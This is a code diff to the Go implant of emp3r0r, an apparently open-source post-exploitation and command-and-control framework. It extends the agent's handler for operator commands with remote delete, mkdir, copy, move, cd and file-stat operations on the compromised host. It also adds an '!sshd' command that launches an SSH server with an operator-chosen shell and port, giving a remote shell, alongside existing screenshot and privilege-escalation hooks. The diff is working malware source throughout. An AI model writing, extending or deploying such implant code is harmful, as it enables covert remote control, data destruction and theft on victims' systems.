@@ -14,6 +14,7 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
+	"github.com/otiai10/copy"
 )
 
 // exec cmd, receive data, etc
@@ -51,7 +52,7 @@ func processCCData(data *MsgTunData) {
 			}
 
 			out, err = util.Screenshot()
-			if err != nil {
+			if err != nil || out == "" {
 				out = fmt.Sprintf("Error: failed to take screenshot: %v", err)
 				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 				goto send
@@ -92,13 +93,57 @@ func processCCData(data *MsgTunData) {
 
 		// remove file/dir
 		if cmdSlice[0] == "rm" {
-			out = "rm failed"
-			if len(cmdSlice) != 2 {
+			if len(cmdSlice) < 2 {
 				return
 			}
 
-			if os.RemoveAll(cmdSlice[1]) == nil {
-				out = "Deleted " + cmdSlice[1]
+			path := strings.Join(cmdSlice[1:], " ")
+			out = "Deleted " + path
+			if err = os.RemoveAll(path); err != nil {
+				out = fmt.Sprintf("Failed to delete %s: %v", path, err)
+			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
+		// mkdir
+		if cmdSlice[0] == "mkdir" {
+			if len(cmdSlice) < 2 {
+				return
+			}
+
+			path := strings.Join(cmdSlice[1:], " ")
+			out = "Mkdir " + path
+			if err = os.MkdirAll(path, 0700); err != nil {
+				out = fmt.Sprintf("Failed to mkdir %s: %v", path, err)
+			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
+		// copy file/dir
+		if cmdSlice[0] == "cp" {
+			if len(cmdSlice) < 3 {
+				return
+			}
+
+			out = fmt.Sprintf("%s has been copied to %s", cmdSlice[1], cmdSlice[2])
+			if err = copy.Copy(cmdSlice[1], cmdSlice[2]); err != nil {
+				out = fmt.Sprintf("Failed to copy %s to %s: %v", cmdSlice[1], cmdSlice[2], err)
+			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
+		}
+
+		// move file/dir
+		if cmdSlice[0] == "mv" {
+			if len(cmdSlice) < 3 {
+				return
+			}
+
+			out = fmt.Sprintf("%s has been moved to %s", cmdSlice[1], cmdSlice[2])
+			if err = os.Rename(cmdSlice[1], cmdSlice[2]); err != nil {
+				out = fmt.Sprintf("Failed to move %s to %s: %v", cmdSlice[1], cmdSlice[2], err)
 			}
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 			goto send
@@ -107,12 +152,13 @@ func processCCData(data *MsgTunData) {
 		// change directory
 		if cmdSlice[0] == "cd" {
 			out = "cd failed"
-			if len(cmdSlice) != 2 {
+			if len(cmdSlice) < 2 {
 				return
 			}
 
-			if os.Chdir(cmdSlice[1]) == nil {
-				out = "changed directory to " + cmdSlice[1]
+			path := strings.Join(cmdSlice[1:], " ")
+			if os.Chdir(path) == nil {
+				out = "changed directory to " + strconv.Quote(path)
 			}
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 			goto send
@@ -189,19 +235,22 @@ func processCCData(data *MsgTunData) {
 				return
 			}
 
-			fi, err := os.Stat(cmdSlice[1])
-			if err != nil {
-				out = fmt.Sprintf("cant stat file %s: %v", cmdSlice[1], err)
+			path := cmdSlice[1]
+			fi, err := os.Stat(path)
+			if err != nil || fi == nil {
+				out = fmt.Sprintf("cant stat file %s: %v", path, err)
+				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+				goto send
 			}
-			var fstat util.FileStat
-			fstat.Permission = fi.Mode().String()
+			fstat := &util.FileStat{}
+			fstat.Name = util.FileBaseName(path)
 			fstat.Size = fi.Size()
-			fstat.Checksum = tun.SHA256SumFile(cmdSlice[1])
-			fstat.Name = util.FileBaseName(cmdSlice[1])
+			fstat.Checksum = tun.SHA256SumFile(path)
+			fstat.Permission = fi.Mode().String()
 			fiData, err := json.Marshal(fstat)
 			out = string(fiData)
 			if err != nil {
-				out = fmt.Sprintf("cant marshal file info %s: %v", cmdSlice[1], err)
+				out = fmt.Sprintf("cant marshal file info %s: %v", path, err)
 			}
 
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
@@ -244,6 +293,24 @@ func processCCData(data *MsgTunData) {
 			out = lpeHelper(helper)
 			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
 			goto send
+		}
+
+		// sshd server
+		if cmdSlice[0] == "!sshd" {
+			if len(cmdSlice) < 3 {
+				log.Printf("args error: %s", cmdSlice)
+				return
+			}
+			log.Printf("Got sshd request: %s", cmdSlice)
+			shell := cmdSlice[1]
+			port := cmdSlice[2]
+			go func() {
+				err = SSHD(shell, port)
+				if err != nil {
+					log.Printf("Failed to start SSHD: %v", err)
+				}
+			}()
+			return
 		}
 
 		// proxy server
